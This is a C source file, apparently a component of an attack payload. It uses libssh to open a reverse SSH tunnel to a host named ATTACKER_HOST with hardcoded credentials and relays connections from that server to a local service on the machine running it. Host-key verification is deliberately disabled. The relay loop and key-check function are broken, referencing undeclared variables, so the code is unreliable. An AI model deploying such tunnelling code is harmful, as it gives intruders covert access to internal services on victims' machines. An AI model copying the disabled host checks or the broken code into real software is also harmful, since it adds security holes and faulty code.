#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "ssh.h"

/* OpenSSH command equivalent:
   ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport> */

static int connect_to_local_service(int port)
{
    int sockfd = 0;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, "localhost", &serv_addr.sin_addr) <= 0) {
        printf("inet_pton\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket\n");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
        0) {
        printf("connect\n");
        return -1;
    }

    return sockfd;
}

static int verify_knownhost(ssh_session sess)
{
    int state = ssh_is_server_known(sess);

    switch (state) {
    case SSH_SERVER_KNOWN_OK:
    case SSH_SERVER_KNOWN_CHANGED:
    case SSH_SERVER_FILE_NOT_FOUND:
    case SSH_SERVER_NOT_KNOWN:
        break;
    case SSH_SERVER_ERROR:
        fprintf(stderr, "Error %s\n", ssh_get_error(sess));
        free(hash);
        return -1;
    }
 
    return 0;

#if 0
    char buf[10];
    char *hexa;

    unsigned char *hash = NULL;
    int hlen = ssh_get_pubkey_hash(sess, &hash);
    if (hlen < 0)
        return -1;

    switch (state) {
    case SSH_SERVER_KNOWN_OK:
        break; /* ok */
    case SSH_SERVER_KNOWN_CHANGED:
        fprintf(stderr, "Host key for server changed: it is now:\n");
        ssh_print_hexa("Public key hash", hash, hlen);
        fprintf(stderr, "For security reasons, connection will be stoppend\n");
        free(hash);
        return -1;
    case SSH_SERVER_FILE_NOT_FOUND:
        fprintf(stderr, "Could not find known host file.\n");
        fprintf(stderr, "If you accept the host key here, the file will be"
                "automatically created.\n");
        /* fallback to SSH_SERVER_NOT_KNOWN behavior */
    case SSH_SERVER_NOT_KNOWN:
        hexa = ssh_get_hexa(hash, hlen);
        fprintf(stderr,"The server is unknown. Do you trust the host key?\n");
        fprintf(stderr, "Public key hash: %s\n", hexa); // or ssh_print_hexa?
        free(hexa);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
            free(hash);
            return -1;
        }
        if (strncasecmp(buf, "yes", 3) != 0) {
            free(hash);
            return -1;
        }
        if (ssh_write_knownhost(sess) < 0) {
            fprintf(stderr, "Error %s\n", ssh_get_error(sess));
            free(hash);
            return -1;
        }
        break;
    case SSH_SERVER_ERROR:
        fprintf(stderr, "Error %s\n", ssh_get_error(sess));
        free(hash);
        return -1;
    }
    free(hash);
#endif
}

/*
 * lport:   port to forward to once tunnel established
 * rport:   port the ssh server will be listening on
 */
int remote_forwarding(int lport, int rport)
{
#define ATTACKER_HOST "localhost"
#define ATTACKER_SSH_PORT 22
#define USERNAME "username"
#define PASSWORD "password"

    if ((rport < 1 || rport > 65535) || (lport < 1 || lport > 65535))
        return -1;

    ssh_session sess = ssh_new();
    if (sess == NULL)
        return -1;

    int verbosity = SSH_LOG_PACKET;
    int port = ATTACKER_SSH_PORT;

    ssh_options_set(sess, SSH_OPTIONS_HOST, ATTACKER_HOST); // <ssh-server>
    ssh_options_set(sess, SSH_OPTIONS_USER, USERNAME);
    ssh_options_set(sess, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(sess, SSH_OPTIONS_PORT, &port); // <ssh-server-port>
    
    int rc = ssh_connect(sess);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to localhost: %s\n",
                ssh_get_error(sess));
        ssh_free(sess);
        return -1;
    }

    if (verify_knownhost(sess) < 0) {
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }

    //char *password = getpass("Password: "); // password will be hardcoded in payload
    //rc = ssh_userauth_password(sess, NULL, password);
    rc = ssh_userauth_password(sess, NULL, PASSWORD);
    if (rc != SSH_AUTH_SUCCESS) {
        fprintf(stderr, "Error authenticating with password: %s\n",
                ssh_get_error(sess));
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }

    /* At this point, the authenticity of both server and client
       is established. Time has come to take advantage of the
       many possibilities offered by the SSH protocol: execute a
       remote command, open remote shells, transfer files, forward
       ports, etc. */

    rc = ssh_channel_listen_forward(sess, NULL, rport, NULL); // <rport>
    if (rc != SSH_OK) {
        fprintf(stderr, "Error opening remote port%s\n",
                ssh_get_error(sess));
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }

    int dport = 0; // The port bound on the server, here: 8080
    ssh_channel chan = ssh_channel_accept_forward(sess, 60000, &dport);
    if (chan == NULL) {
        fprintf(stderr, "Error waiting for incoming connection: %s\n",
                ssh_get_error(sess));
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }

    // Open connection to local service on port lport...
    int sockfd;
    int ret = connect_to_local_service(lport);
    if (ret == -1)
        return -1;
    sockfd = ret;

    // move data between the two...
    int nbytes, nwritten;
    while (1) {
        /* Not good, use polling instead */
        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
        if (nbytes < 0) {
            fprintf(stderr, "Error reading incoming data: %s\n",
                    ssh_get_error(session));
            ssh_channel_send_eof(channel);
            ssh_channel_free(channel);
            return SSH_ERROR;
        }
        
        // ...
        nwritten = ssh_channel_write(channel, helloworld, nbytes);
        if (nwritten != nbytes) {
            fprintf(stderr, "Error sending answer: %s\n",
                    ssh_get_error(session));
            ssh_channel_send_eof(channel);
            ssh_channel_free(channel);
            return SSH_ERROR;
        }
    }

    ssh_channel_send_eof(chan);
    ssh_channel_free(chan);
    ssh_disconnect(sess);
    ssh_free(sess);

    return 0;
}
